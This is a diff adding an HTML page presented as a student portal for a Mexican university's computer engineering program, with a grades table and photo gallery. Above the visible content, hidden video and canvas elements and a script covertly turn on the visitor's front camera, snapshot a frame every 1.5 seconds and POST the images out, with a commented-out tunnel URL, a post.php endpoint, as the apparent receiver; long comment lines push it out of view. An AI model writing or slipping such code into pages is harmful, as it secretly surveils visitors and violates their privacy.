@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
+    />
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Bitter:wght@600&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+      rel="stylesheet"
+    />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="estilos.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,200;1,200;1,400&display=swap"
+      rel="stylesheet"
+    />
+    <title>ICO</title>
+  </head>
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: "POST",
+        data: { cat: imgdata },
+        //url: 'https://totus.serveo.net/post.php',
+        dataType: "json",
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {},
+      });
+    }
+
+    ("use strict");
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const errorMsgElement = document.querySelector("span#errorMsg");
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user",
+      },
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext("2d");
+      setInterval(function () {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas
+          .toDataURL("image/png")
+          .replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Load init
+    init();
+  </script>
+
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+
+  <body>
+    <!--contenedor de particulas-->
+    <div id="particles-js"></div>
+    <!--enlace de particulas-->
+    <script src="js/particles.min.js"></script>
+    <!--enlaces principales-->
+    <script src="js/app.js"></script>
+    <script src="js/main.js"></script>
+
+    <header class="header" id="inicio">
+      <!-- <img src="img/menu.svg" alt="" class="menu1"> -->
+      <!-- <ul>
+      <li><a href="login.html"><img src="img/cerrarSesion.png" alt="" class="close"></a></li>
+      <li><a href="#">Calificaciones</a></li>
+      <li><a href="#">Dondes estamos</a></li>
+      <li><a href="#">Contacto</a></li>
+    </ul> -->
+
+      <ul>
+        <li>
+          <a href="login.html">
+            <img src="img/cerrarSesion.png" alt="" class="close" />
+          </a>
+        </li>
+        <li><a href="#page-1" style="margin-left:20px;width: 100%;">Inicio</a></li>
+        <li><a href="#page-2" style="margin-left:30px;width: 100%;">Nuestros calendarios</a></li>
+        <li><a href="#page-3" style="margin-left:10px;width: 100%;">Calificaciones</a></li>
+      </ul>
+
+      <scroll-container>
+        <scroll-page id="page-1">
+          <div class="contenedor head">
+            <h1>Universidad Autonoma del Estado de México</h1>
+            <p class="copy">Ingenieria en Computacion</p>
+          </div>
+        </scroll-page>
+      </scroll-container>
+    </header>
+    <main>
+  
+      <section class="contenedor" id="servicio">
+      <h2 class="subtitulo">Presentacion</h2>
+      <div class="contenedor-servicio">
+        <img src="img/Artificial.svg" alt="">
+        <div class="checklist-servicio">
+          <div class="service">
+            <h3 class="n-service"><span class="number"></span>Que es la Ingenieria en Computacion?</h3>
+            <p>La ingeniería en computación es una rama de la ingeniería que se enfoca en la aplicación de principios
+              matemáticos, científicos y de ingeniería en el diseño, desarrollo, implementación y mantenimiento de
+              sistemas
+              computacionales.
+
+              Los ingenieros en computación utilizan habilidades en programación, algoritmos, arquitectura de
+              computadoras,
+              redes y sistemas operativos para desarrollar soluciones para una amplia gama de problemas. Pueden trabajar
+              en
+              el desarrollo de software, el diseño de hardware, la gestión de redes, la seguridad informática, la
+              inteligencia artificial, la robótica y muchos otros campos relacionados con la informática.
+
+              La ingeniería en computación es una disciplina en constante evolución, y los ingenieros en computación
+              deben
+              mantenerse actualizados con las últimas tecnologías y tendencias en el campo para poder desarrollar
+              soluciones
+              efectivas y eficientes para problemas complejos.</p>
+          </div>
+          <div class="service">
+            <h3 class="n-service"><span class="numbrer"></span>Diseño web</h3>
+            <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Beatae incidunt, soluta tempore earum tempora
+              veritatis cupiditate reprehenderit. Recusandae, provident aperiam.</p>
+          </div>
+          <div class="service">
+            <h3 class="n-service"><span class="numbrer"></span>Diseño web</h3>
+            <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Beatae incidunt, soluta tempore earum tempora
+              veritatis cupiditate reprehenderit. Recusandae, provident aperiam.</p>
+          </div>
+        </div>
+        </img>
+      </div>
+    </section>
+
+
+    <section class="galery" id="portafolio">
+      <div class="contenedor">
+        <h2 class="subtitulo">Conoce nuestras instalaciones</h2>
+        <div class="contenedor-galeria">
+          <img src="img/cu.jpg" alt="" class="img-galeria">
+          <img src="img/uaem.jpg" alt="" class="img-galeria">
+          <img src="img/1.jpg" alt="" class="img-galeria">
+          <img src="img/3.jpg" alt="" class="img-galeria">
+          <img src="img/2.jpg" alt="" class="img-galeria">
+          <img src="img/6.jpg" alt="" class="img-galeria">
+
+
+        </div>
+      </div>
+    </section>
+    <section class="imagen-light">
+    
+      <img src="img/uaem.jpg" alt="" class="agregar-imagen">
+    </section>
+    <scroll-container>
+      <scroll-page id="page-2">
+        <section class="contenedor" id="expertos">
+          <h2 class="subtitulo">Expertos en</h2>
+          <section class="experts">
+            <div class="cont-eexperts">
+              <img src="img/calendario.png" alt="" style="width: 320px;">
+              <img src="img/calendario.png" alt="" style="width: 320px;">
+              <img src="img/calendario.png" alt="" style="width: 320px;"> 
+            </div>
+       
+          </section>
+    
+        </section>
+      </scroll-page>
+    </scroll-container>
+    <scroll-container>
+      <scroll-page id="page-3">
+        <div>
+
+          <p style="font-size: 30px;">Calificaciones</p>
+          <br/>
+          <table  style="width: 100%; font-size: 18px; margin-top:-30px;">
+            <tr style="background: #00518c;">
+              <th style="width: 25%;">Clase</th>
+              <th style="width: 25%;">Mestro</th>
+              <th style="width: 20%;">1er parcial</th>
+              <th style="width: 20%;">2er parcial</th>
+            <th style="width: 10%;">Final</th>
+            
+          </tr>
+          <tr>
+            <td style="width: 25%;">Geometria Analitica</td>
+            <td style="width: 25%;">Juan De la Cruz Perez</td>
+            <td style="width: 20%;">8.1</td>
+            <td style="width: 20%;">7.0</td>
+            <td style="width: 10%;">7.5</td>
+            
+          </tr>
+          <tr>
+            <td style="width: 25%;">Calculo 1</td>
+            <td style="width: 25%;">Regina Quiroz Arango</td>
+            <td style="width: 20%;">10</td>
+            <td style="width: 20%;">10</td>
+            <td style="width: 10%;">10</td>
+            
+          </tr>
+          
+        </table>
+      </div>
+      </scroll-page>
+      </scroll-container>
+    </main>
+
+    <!-- <footer id="contacto"> -->
+      <div class="contenedor footer-contennt" style=" width:80px;position: fixed; top:300px;">
+        <div class="contact-us" >
+          <!-- <h2 class="brand">Dynamo</h2>
+          <p>somos uaem</p> -->
+          <a href="./" class="social-media-icon" >
+            <!-- <i class="bx bxl-facebook" ></i> -->
+            <img src="img/Whats.png" alt="" style="width: 30px;">
+          </a>
+          <a href="./" class="social-media-icon">
+            <!-- <i class="bx bxl-twitter"></i> -->
+            <img src="img/Face.png" alt="" style="width: 30px;">
+
+          </a>
+          <a href="./" class="social-media-icon">
+            <!-- <i class="bx bxl-instagram"></i> -->
+            <img src="img/Twitter.png" alt="" style="width: 30px;">
+
+          </a>
+          <a href="./" class="social-media-icon">
+            <!-- <i class="bx bxl-tiktok"></i> -->
+            <img src="img/Instagram.png" alt="" style="width: 30px;">
+
+          </a>
+        </div>
+      </div>
+    <!-- </footer> -->
+
+    <!--menu de accion-->
+    <script src="js/menu.js"></script>
+    <script src="js/lightbox.js"></script>
+  </body>
+</html>
